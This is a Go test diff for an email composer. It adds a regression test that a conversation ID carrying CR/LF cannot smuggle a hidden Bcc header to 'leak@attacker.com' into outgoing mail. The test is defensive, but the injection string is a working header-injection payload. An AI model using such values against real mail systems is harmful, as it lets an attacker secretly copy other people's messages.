@@ -325,3 +325,40 @@ func TestComposeMultipartMessageConversationIDHeader(t *testing.T) {
 		t.Errorf("X-E2A-Conversation-Id = %q, want conv-xyz", got)
 	}
 }
+
+// Regression: an attacker-controlled conversation_id containing CR/LF must
+// not smuggle additional headers (e.g. blind Bcc) into the composed
+// message. The header writer strips CR and LF from values as last-line
+// defense; the API layer also rejects with 400, but the composer must
+// remain safe even if a future caller forgets to validate.
+func TestComposeMessageStripsCRLFFromConversationID(t *testing.T) {
+	malicious := "abc\r\nBcc: leak@attacker.com"
+	out, err := ComposeMessage(
+		"sender@agents.e2a.dev",
+		[]string{"target@victim.com"}, nil,
+		"hi", "benign", "text/plain",
+		"", "agents.e2a.dev", "",
+		malicious,
+	)
+	if err != nil {
+		t.Fatalf("ComposeMessage failed: %v", err)
+	}
+	msg := string(out)
+
+	// Injection would manifest as a fresh header line — i.e. CRLF
+	// followed by "Bcc:" — anywhere in the message.
+	if strings.Contains(msg, "\r\nBcc:") {
+		t.Errorf("header injection: smuggled Bcc started a new header line\n%s", msg)
+	}
+	parsed, err := mail.ReadMessage(strings.NewReader(msg))
+	if err != nil {
+		t.Fatalf("composed message not parseable: %v", err)
+	}
+	got := parsed.Header.Get("X-E2A-Conversation-Id")
+	if want := "abcBcc: leak@attacker.com"; got != want {
+		t.Errorf("X-E2A-Conversation-Id = %q, want %q (CR/LF stripped, remaining bytes intact)", got, want)
+	}
+	if parsed.Header.Get("Bcc") != "" {
+		t.Errorf("Bcc header should be absent, got %q", parsed.Header.Get("Bcc"))
+	}
+}
